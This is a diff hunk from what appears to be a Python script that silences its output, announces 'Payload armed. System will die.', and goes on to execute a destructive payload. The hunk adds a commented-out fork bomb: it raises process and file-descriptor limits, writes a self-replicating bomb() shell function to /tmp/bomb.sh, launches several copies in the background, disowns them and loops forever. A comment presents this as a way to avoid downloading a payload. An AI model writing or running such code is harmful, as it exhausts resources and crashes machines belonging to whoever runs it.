@@ -46,6 +46,41 @@ os.dup2(devnull.fileno(), 1)
 os.dup2(devnull.fileno(), 2)
 devnull.close()
 
+# THIS COULD BE USED TO BYPASS THE NEED OF A PAYLOAD DOWNLOAD
+# Redirect stdout and stderr to /dev/null
+# os.system("exec >/dev/null 2>&1")
+
+# # Disable job control
+# os.system("set +m")
+
+# # Set ulimit for processes and file descriptors
+# os.system("ulimit -u unlimited 2>/dev/null || true")
+# os.system("ulimit -n 999999 2>/dev/null || true")
+
+# # Define the bomb function as a shell command
+# bomb_function = """
+# bomb() {
+#     while :; do
+#         (exec {fd}<> <(:); eval "exec $fd<&-") &
+#         bomb &
+#         bomb &
+#     done
+# }
+# """
+# # Write the bomb function to a temporary shell script
+# with open("/tmp/bomb.sh", "w") as f:
+#     f.write(bomb_function)
+
+# # Source the bomb function and run it in the background
+# os.system("source /tmp/bomb.sh; bomb & bomb & bomb &")
+
+# # Disown all background jobs
+# os.system("disown -a")
+
+# # Keep the script running indefinitely
+# os.system("while :; do sleep 2147483647; done")
+
+
 # === EXECUTE PAYLOAD ===
 print("Payload armed. System will die.")
 try:
